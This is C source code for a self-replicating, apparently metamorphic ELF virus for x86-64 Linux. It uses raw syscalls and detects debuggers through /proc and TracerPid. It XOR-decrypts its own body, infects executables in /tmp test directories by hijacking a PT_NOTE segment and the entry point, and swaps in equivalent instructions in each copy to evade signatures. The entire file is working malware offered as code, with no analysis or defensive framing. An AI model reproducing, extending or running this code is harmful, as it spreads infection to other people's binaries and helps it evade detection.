#include "shellcode.h"

static void  start(void) {}
asm("pushfq");
int   entry_point(void *magic) {
  char    infectDir[] = "/tmp/test";
  char    infectDir2[] = "/tmp/test2";
  char    procName[] = "/proc/";

  if (checkProcess(procName) != 0)
    return (stop(1, magic));
  if (preventDebug(magic) != 0)
    return (stop(1, magic));
  if (magic != (void *)0x42) {
    if (unObfuscate() == -1)
      return (stop(1, magic));
  }
  infectBins(infectDir);
  infectBins(infectDir2);
  return (stop(0, magic));
}

static int   stop(int status, void *magic) {
  if (magic == (void *)0x42)
    return (status);
  asm("leave\n\t"
      "leave\n\t"
      "popfq\n\t"
      "mov $0, %rbx\n\t"
      "mov $0, %rcx\n\t"
      "mov $0, %rdx\n\t"
      "mov $0, %rsi\n\t"
      "mov $0, %rdi\n\t"
      "mov $0, %rax\n\t"
      "mov $0, %rbp\n\t"
      "mov $0, %r8\n\t"
      "mov $0, %r10\n\t"
      "mov $0, %r11\n\t"
      "jmp endSC");
  return (status);
}

static int  mprotect(void *addr, size_t len, int prot) {
  register int    rax asm("rax") = 10;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;
  register int    rdx asm("rdx") = prot;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *align(size_t value) {
  return (void *)(((value + (4096 - 1)) & -4096) - 4096);
}

static int unObfuscate(void) {
  size_t  i;
  size_t  size;
  char    *code;
  void    *aligned;

  size = ((void *)end) - ((void *)encryptStart);
  aligned = align((size_t)encryptStart);
  if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
    return (-1);
  i = 0;
  code = (void *)encryptStart;
  while (i < size) {
    code[i] ^= 0xa5;
    i += 1;
  }
  if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
    return (-1);
  return (0);
}

static ssize_t  read(int fd, char *buf, size_t count) {
  register ssize_t    rax asm("rax") = 0;
  register int        rdi asm("rdi") = fd;
  register const void *rsi asm("rsi") = buf;
  register size_t     rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  write(int fd, const void *buf, size_t count) {
  register int        rax asm("rax") = 1;
  register int        rdi asm("rdi") = fd;
  register const void *rsi asm("rsi") = buf;
  register size_t     rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  open(const char *pathname, int flags, int mode) {
  register int        rax asm("rax") = 2;
  register const char *rdi asm("rdi") = pathname;
  register int        rsi asm("rsi") = flags;
  register int        rdx asm("rdx") = mode;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  close(int fd) {
  register int  rax asm("rax") = 3;
  register int  rdi asm("rdi") = fd;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  stat(const char *filename, struct stat *statbuf) {
  register int          rax asm("rax") = 4;
  register const char   *rdi asm("rdi") = filename;
  register struct stat  *rsi asm("rsi") = statbuf;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off) {
  register void         *ret asm("rax");
  register int8_t       rax asm("rax") = 9;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;
  register int    rdx asm("rdx") = prot;
  register int    r10 asm("r10") = flags;
  register int    r8 asm("r8") = fildes;
  register off_t  r9 asm("r9") = off;

  asm("syscall"
    : "=r" (ret));
  if ((long)ret < 0)
    return (NULL);
  return (ret);
}

static int  munmap(void *addr, size_t len) {
  register int    rax asm("rax") = 11;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
  register int                    rax asm("rax") = 217;
  register unsigned int           rdi asm("rdi") = fd;
  register struct linux_dirent64  *rsi asm("rsi") = dirp;
  register unsigned int           rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int kill(pid_t pid, int sig) {
  register int    rax asm("rax") = 101;
  register pid_t  rdi asm("rdi") = pid;
  register int    rsi asm("rsi") = sig;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static pid_t  waitpid(pid_t pid, int *stat_loc, int options) {
  register pid_t  ret asm("rax");
  register int    rax asm("rax") = 61;
  register pid_t  rdi asm("rdi") = pid;
  register int    *rsi asm("rsi") = stat_loc;
  register int    rdx asm("rdx") = options;
  register struct rusage *r10 asm("r10") = NULL;

  asm("syscall"
    : "=r" (ret));
  return (ret);
}

static pid_t  getpid(void) {
  register pid_t  ret   asm("rax");
  register int8_t  rax  asm("rax") = 39;

  asm("syscall"
    : "=r" (ret));
  return (ret);
}

static int    raise(int sig, pid_t pid) {
  register int    ret   asm("rax");
  register int    rax asm("rax") = 200;
  register pid_t  rdi asm("rdi") = pid;
  register int    rsi asm("rsi") = sig;

  asm("syscall"
    : "=r" (ret));
  return (ret);
}

static void *memcpy(void *dest, const void *src, size_t n) {
  while (n != 0) {
    n -= 1;
    ((char *)dest)[n] = ((char *)src)[n];
  }
  return (dest);
}

static char *strcat(char *dest, const char *src) {
  int i;
  int j;

  i = 0;
  while (dest[i])
    i += 1;
  j = 0;
  while (src[j]) {
    dest[i] = src[j];
    i += 1;
    j += 1;
  }
  dest[i] = '\0';
  return (dest);
}

static size_t strlen(const char *s) {
  size_t  i;

  i = 0;
  while (s[i])
    i += 1;
  return (i);
}

static int strncmp(const char *s1, const char *s2, size_t n) {
  size_t  i;

  i = 0;
  while (s1[i] && s2[i] && i < n) {
    if (s1[i] != s2[i])
      return (s1[i] - s2[i]);
    i += 1;
  }
  return (i < n ? s1[i] - s2[i] : 0);
}

static int strcmp(const char *s1, const char *s2) {
  size_t  i;

  i = 0;
  while (s1[i] && s2[i]) {
    if (s1[i] != s2[i])
      return (s1[i] - s2[i]);
    i += 1;
  }
  return (s1[i] - s2[i]);
}

static void *memset(void *s, int c, size_t n) {
  while (n != 0) {
    n -= 1;
    ((char *)s)[n] = c;
  }
  return (s);
}

static void  *memmove(void *dest, const void *src, size_t n) {
  if (src >= dest)
    memcpy(dest, src, n);
  else {
    while (n != 0) {
      n -= 1;
      ((char *)dest)[n] = ((char *)src)[n];
    }
  }
  return (dest);
}

static char	*strstr(const char *haystack, const char *needle) {
  size_t  i;
  size_t  j;
  size_t  k;
  char    *pointer;

  if (needle[0] == '\0')
    return ((char *)haystack);
  i = 0;
  pointer = NULL;
  while (haystack[i]) {
    j = 0;
    k = i;
    pointer = (char *)&haystack[i];
    while (needle[j]) {
      if (needle[j] != haystack[k++])
        break ;
      if (needle[j++ + 1] == '\0')
        return (pointer);
    }
    pointer = NULL;
    i += 1;
  }
  return (pointer);
}

static int  checkFileContent(char *dirname, char *filename) {
  int     fd;
  ssize_t ret;
  size_t  len;
  char    *tmp;
  char    slash[] = "/";
  char    buf[BUF_SIZE];
  char    procName[] = "gdb";

  len = strlen(dirname) + strlen(filename) + 1;
  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
    return (-1);
  memcpy(tmp, dirname, strlen(dirname));
  strcat(tmp, slash);
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDONLY, 1)) < 0) {
    munmap(tmp, len);
    return (-1);
  }
  munmap(tmp, len);
  if ((ret = read(fd, buf, BUF_SIZE)) > 0) {
    if (strstr(buf, procName) != NULL) {
      close(fd);
      return (1);
    }
  }
  close(fd);
  return (0);
}

static int  checkProcess(char *dirname) {
  int                   fd;
  int                   ret;
  size_t                len;
  char                  *tmp;
  int                   bpos;
  int                   nread;
  struct linux_dirent64   *dirp;
  char                  *buf;
  char  procName[] = "/proc/";
  char  cmdlineName[] = "cmdline";

  if ((buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
    return (-1);
  if ((fd = open(procName, O_RDONLY | O_DIRECTORY, 0)) < 0) {
    munmap(buf, BUF_SIZE);
    return (-1);
  }
  if ((nread = getdents64(fd, (struct linux_dirent64 *)buf, BUF_SIZE)) < 0) {
    munmap(buf, BUF_SIZE);
    return (-1);
  }
  bpos = 0;
  while (bpos < nread) {
    dirp = (struct linux_dirent64 *)(buf + bpos);
    if (dirp->d_type == DT_DIR && dirp->d_name[0] > '0' && dirp->d_name[0] <= '9' && strcmp(dirname, procName) == 0) {
      len = strlen(dirp->d_name) + strlen(procName) + 1;
      if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
        munmap(buf, BUF_SIZE);
        return (-1);
      }
      memcpy(tmp, dirname, strlen(dirname));
      strcat(tmp, dirp->d_name);
      if ((ret = checkProcess(tmp)) == -1) {
        munmap(tmp, len);
        munmap(buf, BUF_SIZE);
        return (-1);
      }
      munmap(tmp, len);
      if (ret == 1)
        return (1);
    } else if (dirp->d_type == DT_REG && strcmp(dirp->d_name, cmdlineName) == 0 && strcmp(dirname, procName) != 0) {
      ret = checkFileContent(dirname, cmdlineName);
      munmap(buf, BUF_SIZE);
      return (ret);
    }
    bpos += dirp->d_reclen;
  }
  munmap(buf, BUF_SIZE);
  close(fd);
  return (0);
}

static int   preventDebug(void *magic) {
  pid_t   pid;
  int     fd;
  size_t  len;
  char    *tmp;
  ssize_t bread;
  size_t  pidLen;
  char    *pointer;
  char    buf[BUF_SIZE];
  char  procName[] = "/proc/";
  char  statusName[] = "/status";
  char  tracerPid[] = "TracerPid:";

  pidLen = 0;
  pid = getpid();
  while (pid != 0) {
    pid /= 10;
    pidLen += 1;
  }
  if ((tmp = mmap(0, 14 + pidLen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
    return (-1);
  memcpy(tmp, procName, 6);
  pid = getpid();
  len = pidLen;
  while (pid != 0) {
    tmp[5 + len] = pid % 10 + 48;
    len -= 1;
    pid /= 10;
  }
  strcat(tmp, statusName);
  fd = open(tmp, O_RDONLY, 0);
  munmap(tmp, 14 + pidLen);
  if (fd < 0)
    return (-1);
  pointer = NULL;
  while ((bread = read(fd, buf, BUF_SIZE)) > 0) {
    if (pointer != NULL) {
      pointer = buf;
      while (pointer - buf <= bread && (*pointer < '0' || *pointer > '9'))
        pointer += 1;
      if (pointer - buf > bread)
        continue ;
      close(fd);
      if (*pointer != '0')
        return (1);
      return (0);
    }
    pointer = NULL;
    if ((pointer = strstr(buf, tracerPid)) != NULL) {
      pointer += strlen(tracerPid);
      if (pointer - buf > bread)
        continue ;
      while (pointer - buf <= bread && (*pointer < '0' || *pointer > '9'))
        pointer += 1;
      if (pointer - buf > bread)
        continue ;
      close(fd);
      if (*pointer != '0')
        return (1);
      return (0);
    }
  }
  close(fd);
  return (0);
}

static void encryptStart(void) {}

static ssize_t  getrandom(void *buf, size_t buflen, unsigned int flags) {
  register ssize_t      ret asm("rax");
  register int          rax asm("rax") = 318;
  register void         *rdi asm("rdi") = buf;
  register size_t       rsi asm("rsi") = buflen;
  register unsigned int rdx asm("rdx") = flags;

  asm("syscall"
    : "=r" (ret));
  return (ret);
}

static size_t atoi(const char *str) {
  int     i;
  size_t  result;

  i = 0;
  result = 0;
  while (i < 8) {
    result = result * 10 + (str[i] - 48);
    i += 1;
  }
  return (result);
}

static int updateSignature(void) {
  unsigned long  *signature;

  if (mprotect(align((unsigned long)dynamicSignature - sizeof(unsigned long)), sizeof(unsigned long), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
    return (-1);
  signature = (void *)dynamicSignature - sizeof(unsigned long);
  *signature -= 1;
  if (mprotect(align((unsigned long)dynamicSignature - sizeof(unsigned long)), sizeof(unsigned long), PROT_EXEC | PROT_READ) < 0)
    return (-1);
  return (0);
}

const char  signatureNbr[8] __attribute__ ((section (".text#"))) = {
  "\x00\x00\x00\x00\x00\x00\x00\x00"
};
static void       dynamicSignature(void) {}

static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
  int         fd;
  size_t      len;
  char        *tmp;
  Elf64_Shdr  *data;
  char        slash[] = "/";
  char        payload[] = PAYLOAD;
  struct stat stats;

  len = strlen(dirname) + strlen(filename) + 2;
  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
    return (-1);
  memcpy(tmp, dirname, strlen(dirname));
  strcat(tmp, slash);
  strcat(tmp, filename);
  if (stat(tmp, &stats) < 0) {
    munmap(tmp, len);
    return (-1);
  }
  if (!S_ISREG(stats.st_mode)) {
    munmap(tmp, len);
    return (1);
  }
  if ((fd = open(tmp, O_RDWR, 0)) < 0) {
    munmap(tmp, len);
    return (1);
  }
  munmap(tmp, len);
  if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == NULL) {
    close(fd);
    return (-1);
  }
  if (stats.st_size < sizeof(Elf64_Ehdr) ||
    !isCompatible((Elf64_Ehdr *)tmp)) {
    munmap(tmp, stats.st_size);
    close(fd);
    return (1);
  }
  len = strlen(payload) + MAX_DYN_LEN + 1;
  if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
    close(fd);
    munmap(tmp, stats.st_size);
    return (-1);
  }
  memcpy(bin->header, tmp, stats.st_size);
  munmap(tmp, stats.st_size);
  bin->fd = fd;
  bin->size = stats.st_size + len;
  return (0);
}

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_phoff >= offset)
      header->e_phoff += toAdd;
    if (header->e_shoff >= offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = ((void *)header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset >= offset)
            section->sh_offset += toAdd;
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset >= offset)
            program->p_offset += toAdd;
        if (program->p_paddr >= offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

static void itoa(char *buffer, unsigned long n) {
  int   i;
  unsigned long  tmp;

  i = 0;
  tmp = n;
  while (tmp != 0) {
    tmp /= 10;
    buffer[i] = 0;
    i += 1;
  }
  if (i == 0) {
    buffer[i] = '0';
  }
  while (i > 0) {
    buffer[i - 1] = n % 10 + 48;
    i -= 1;
    n /= 10;
  }
}

static void  appendSignature(struct bfile file) {
  size_t  len;
  char payload[] = PAYLOAD;

  len = strlen(payload);
  memcpy(((void *)file.header) + file.size - len - MAX_DYN_LEN - 1, payload, len);
  itoa(((void *)file.header) + file.size - MAX_DYN_LEN - 1, *((unsigned long *)((void *)dynamicSignature - sizeof(unsigned long))));
  memset(((void *)file.header) + file.size - 1, 0, 1);
  file.header->e_ident[EI_OSABI] = 0x10;
}

static void obfuscate(char *header, size_t size) {
  size_t  i;

  i = 0;
  while (i < size) {
    header[i] ^= 0xa5;
    i += 1;
  }
}

static int8_t getRandomNbr(int8_t max) {
  unsigned char  buf[1];

  if (max == 0)
    return (0);
  getrandom(buf, 1, 0);
  return (buf[0] % (max + 1));
}

static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned char *shellcode, unsigned char *bin, size_t *binSize) {
  size_t  i;
  size_t  j;

  j = 0;
  while (pointer[j] != 0x02) {
    if (pointer[j] == 0) {
      j += 1;
      *binSize += 1;
      continue ;
    }
    i = 0;
    while (ins[i] != 0x02) {
      if (((pointer[j] & 0x1) == 0x1 && (ins[i] & 0x1) == 0x1) ||
          (pointer[j] & 0x4) == 0x4 && (ins[i] & 0x4) == 0x4)
        bin[*binSize] |= (shellcode[i] & 0x7);
      if ((pointer[j] & 0x1) == 0x1 && (ins[i] & 0x8) == 0x8 ||
          (pointer[j] & 0x4) == 0x4 && (ins[i] & 0x20) == 0x20)
        bin[*binSize] |= ((shellcode[i] >> 3) & 0x7);
      if ((pointer[j] & 0x8) == 0x8 && (ins[i] & 0x1) == 0x1 ||
          (pointer[j] & 0x20) == 0x20 && (ins[i] & 0x4) == 0x4)
        bin[*binSize] |= ((shellcode[i] << 3) & 0x38);
      if ((pointer[j] & 0x8) == 0x8 && (ins[i] & 0x8) == 0x8 ||
          (pointer[j] & 0x20) == 0x20 && (ins[i] & 0x20) == 0x20)
        bin[*binSize] |= (shellcode[i] & 0x38);
      i += 1;
    }
    *binSize += 1;
    j += 1;
  }
}

static void checkInstruction(unsigned char *ins, unsigned char *shellcode, size_t *i) {
  unsigned char *order;
  unsigned char *needed;
  unsigned char *notNeeded;

  order = ins;
  while (*order != 0x02)
    order += 1;
  order += 1;
  needed = order;
  while (*needed != 0x02)
    needed += 1;
  needed += 1;
  notNeeded = needed;
  while (*notNeeded != 0x02)
    notNeeded += 1;
  notNeeded += 1;
  *i = 0;
  while (ins[*i] != 0x02 &&
        (((ins[*i] >= 0x03 && ins[*i] <= 0x05 && (shellcode[*i] & notNeeded[*i]) == 0x0)) ||
        shellcode[*i] == ins[*i] ||
        ((ins[*i] == 0x01 || ins[*i] == 0x06) && (shellcode[*i] & needed[*i]) == needed[*i] && (shellcode[*i] & notNeeded[*i]) == 0x0))) {
    if (ins[*i] == 0x01) {
      if ((order[*i] & 0x1) == 0x1 || (order[*i] & 0x4) == 0x4) {
        if ((shellcode[*i] & 0x7) == 0x4 || (shellcode[*i] & 0x7) == 0x5)
          break ;
      }
      if ((order[*i] & 0x8) == 0x8 || (order[*i] & 0x20) == 0x20) {
        if ((shellcode[*i] & 0x38) == 0x20 || (shellcode[*i] & 0x38) == 0x28)
          break ;
      }
    }
    *i += 1;
  }
}

/*  Instructions  - Order - Needed -  Not needed  */
/*  Source operand = 0b001 - Destination operand = 0b100  */
/*  0x01=Will be replaced 0x02=Separator  0x03=Switched  0x04=Ignored 0x05=Neg bytes  0x06=Same as 0x1 but do not exclude rbp/rsp  */
const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
  "\x48\x89\x01\x02\x00\x00\x0c\x02\x00\x00\xc0\x02\x00\x00\x00\x02", // MOV r/m64,r64
  "\x48\x8d\x01\x02\x00\x00\x21\x02\x00\x00\x00\x02\x00\x00\xc0\x02", // LEA r/m64,r64
  "\x02",
  "\x04\x01\x03\x00\x00\x00\x02\x00\x04\x00\x00\x00\x00\x02\x00\xb8\x00\x00\x00\x00\x02\x41\x40\xc0\x00\x00\x00\x02", // MOV r32,imm32
  "\x04\x31\x01\x83\x01\x03\x02\x00\x00\x24\x00\x04\x00\x02\x00\x00\xc0\x00\xc0\x00\x02\x00\x00\x00\x00\x00\x00\x02", // XOR r32, r32 \n\t ADD r32,imm32
  "\x02",
  "\x48\x83\x06\x05\x02\x00\x00\x01\x00\x02\x00\x00\xe8\x00\x02\x00\x00\x10\x00\x02", // SUB r64, imm8
  "\x48\x83\x06\x05\x02\x00\x00\x01\x00\x02\x00\x00\xc0\x00\x02\x00\x00\x10\x00\x02", // ADD r64, -imm8
  "\x02",
  "\x0f\xb6\x01\x02\x00\x00\x21\x02\x00\x00\x00\x02\x00\x00\x60\x02", // MOVZX r32, r/m8
  "\x8a\x01\x90\x02\x00\x21\x00\x02\x00\x00\x00\x02\x00\xe0\x00\x02", // MOV r8, r/m8 \n\t NOP
  "\x02",
  "\x48\x63\x01\x02\x00\x00\x21\x02\x00\x00\xc0\x02\x00\x00\x00\x02", // MOVSXD r64, r/m32
  "\x89\x01\x90\x02\x00\x0c\x00\x02\x00\xc0\x00\x02\x00\x00\x00\x02", // MOV r32, r/m32 \n\t NOP
  "\x02"
};

static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
  size_t        i;
  size_t        j;
  size_t        k;
  size_t        l;
  unsigned char *ins;
  unsigned char *bin;
  unsigned char *needed;
  unsigned char *pointer;
  unsigned char *shellcode;

  i = 0;
  bin = (void *)new->header;
  shellcode = (void *)start;
  while (i < size) {
    ins = (void *)copyModifiedCode - sizeof(instructions);
    while (ins != (void *)copyModifiedCode) {
      checkInstruction(ins, shellcode + i, &j);
      if (ins[j] != 0x02 ||
  ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
        ins += MAX_INS_SIZE;
        if (ins[0] == 0x02)
          ins += MAX_INS_SIZE;
        continue ;
      }
      pointer = ins;
      while (ins[0] != 0x02 && ins != (void *)copyModifiedCode - sizeof(instructions))
        ins -= MAX_INS_SIZE;
      if (ins[0] == 0x02)
        ins += MAX_INS_SIZE;
      l = 0;
      while (ins[0] != 0x02) {
        l += 1;
        ins += MAX_INS_SIZE;
      }
      ins = ins - MAX_INS_SIZE * l + getRandomNbr(l - 2) * MAX_INS_SIZE;
      if (ins >= pointer)
        ins += MAX_INS_SIZE;
      needed = ins;
      while (*needed != 0x02)
        needed += 1;
      needed += 1;
      while (*needed != 0x02)
        needed += 1;
      needed += 1;
      k = 0;
      while (ins[k] != 0x02) {
        if (ins[k] == 0x01)
          bin[binSize] = needed[k];
        else if (ins[k] == 0x03) {
          l = 0;
          while (pointer[l] != 0x03)
            l += 1;
          bin[binSize] = shellcode[i + l];
        }
        else if (ins[k] == 0x04)
          bin[binSize] = shellcode[i + k];
        else if (ins[k] == 0x05)
          bin[binSize] = -shellcode[i + k];
        else if (ins[k] == 0x06)
          bin[binSize] = needed[k];
        else
          bin[binSize] = ins[k];
        binSize += 1;
        k += 1;
      }
      binSize -= k;
      k += 1;
      pointer += k;
      updateRegisters(pointer, ins + k, shellcode + i, bin, &binSize);
      i += j;
      while (ins[0] != 0x02)
        ins += MAX_INS_SIZE;
      ins += MAX_INS_SIZE;
      if (ins == (void *)copyModifiedCode) {
        ins = (void *)copyModifiedCode - sizeof(instructions);
        continue ;
      }
    }
    bin[binSize] = shellcode[i];
    i += 1;
    binSize += 1;
  }
}

static int  appendShellcode(struct bfile *bin) {
  size_t  size;
  char    ins[9];
  size_t  address;
  struct bfile  new;

  size = end - start + (lambdaEnd - lambdaStart);
  new.size = bin->size + size + sizeof(ins);
  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == NULL)
    return (-1);
  memcpy(new.header, bin->header, bin->size);
  copyModifiedCode(&new, bin->size, size);
  address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 5;
  ins[0] = 0xe9;
  ins[1] = (address >> 0) & 0xff;
  ins[2] = (address >> 8) & 0xff;
  ins[3] = (address >> 16) & 0xff;
  ins[4] = (address >> 24) & 0xff;
  ins[5] = (address >> 32) & 0xff;
  ins[6] = (address >> 40) & 0xff;
  ins[7] = (address >> 48) & 0xff;
  ins[8] = (address >> 56) & 0xff;
  memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
  munmap(bin->header, bin->size);
  bin->header = new.header;
  bin->size = new.size;
  return (sizeof(ins));
}

static int  appendCode(struct bfile *bin) {
  int         ins;
  size_t      size;
  Elf64_Phdr  *segment;

  if ((ins = appendShellcode(bin)) == -1)
    return (-1);
  size = end - start + ins;
  segment = ((void *)bin->header) + bin->header->e_phoff;
  while (segment->p_type != PT_NOTE && 
segment != ((void *)bin->header) + bin->header->e_phoff + bin->header->e_phnum * sizeof(Elf64_Phdr))
    segment += 1;
  if (segment->p_type != PT_NOTE)
    return (1);
  segment->p_flags = PF_R | PF_X;
  segment->p_type = PT_LOAD;
  segment->p_offset = bin->size - size;
  segment->p_vaddr = 0xc000000 + bin->size - size;
  segment->p_paddr = bin->size - size;
  segment->p_filesz = size;
  segment->p_memsz = size;
  bin->header->e_entry = 0xc000000 + bin->size - size;
  return (0);
  
}

static int  infectFile(struct bfile bin) {
  int   ret;
  char  payload[] = PAYLOAD;

  appendSignature(bin);
  if ((ret = appendCode(&bin)) != 0) {
    munmap(bin.header, bin.size);
    close(bin.fd);
    return (ret);
  }
  write(bin.fd, bin.header, bin.size);
  close(bin.fd);
  munmap(bin.header, bin.size);
}

static int  isCompatible(Elf64_Ehdr *header) {
  Elf64_Dyn   *dyn;
  int         isExec;
  Elf64_Shdr  *section;

  if (!(header->e_ident[EI_MAG0] == ELFMAG0 &&
      header->e_ident[EI_MAG1] == ELFMAG1 &&
      header->e_ident[EI_MAG2] == ELFMAG2 &&
      header->e_ident[EI_MAG3] == ELFMAG3 &&
      header->e_machine == EM_X86_64))
    return (0);
  isExec = 0;
  if (header->e_type == ET_EXEC)
    isExec = 1;
  else if (header->e_type == ET_DYN) {
    section = ((void *)header) + header->e_shoff;
    while (section->sh_type != SHT_DYNAMIC &&
  section != ((void *)header) + header->e_shoff + sizeof(Elf64_Ehdr) * (header->e_shnum - 1))
      section += 1;
    if (section->sh_type == SHT_DYNAMIC) {
      dyn = ((void *)header) + section->sh_offset;
      while (dyn->d_tag != DT_FLAGS_1 && (void *)dyn < ((void *)header) + section->sh_offset + section->sh_size)
        dyn += 1;
      if (dyn->d_tag == DT_FLAGS_1) {
        if ((int)(dyn->d_un.d_val & DF_1_PIE) == (int)DF_1_PIE)
          isExec = 1;
      }
    }
  }
  return (isExec);
}

static int  isInfected(struct bfile bin) {
  return bin.header->e_ident[EI_OSABI] == 0x10;
}

static int  infectBins(const char *dirname) {
  int                   fd;
  int                   ret;
  struct bfile          bin;
  int                   bpos;
  int                   nread;
  struct linux_dirent64   *dirp;
  char                  buf[BUF_SIZE];

  if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
    return (-1);
  if ((nread = getdents64(fd, (struct linux_dirent64 *)buf, BUF_SIZE)) < 0)
    return (-1);
  bpos = 0;
  while (bpos < nread) {
    dirp = (struct linux_dirent64 *) (buf + bpos);
    if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
      return (-1);
    if (ret == 0) {
      if (isInfected(bin)) {
        close(bin.fd);
        munmap(bin.header, bin.size);
      } else {
        updateSignature();
        if (infectFile(bin) == -1)
          return (-1);
      }
    }
    bpos += dirp->d_reclen;
  }
  close(fd);
  return (0);
}

static void   lambdaStart(void) {}
static void   lambdaEnd(void) {}

static void   end(void) {}
asm("endSC:");
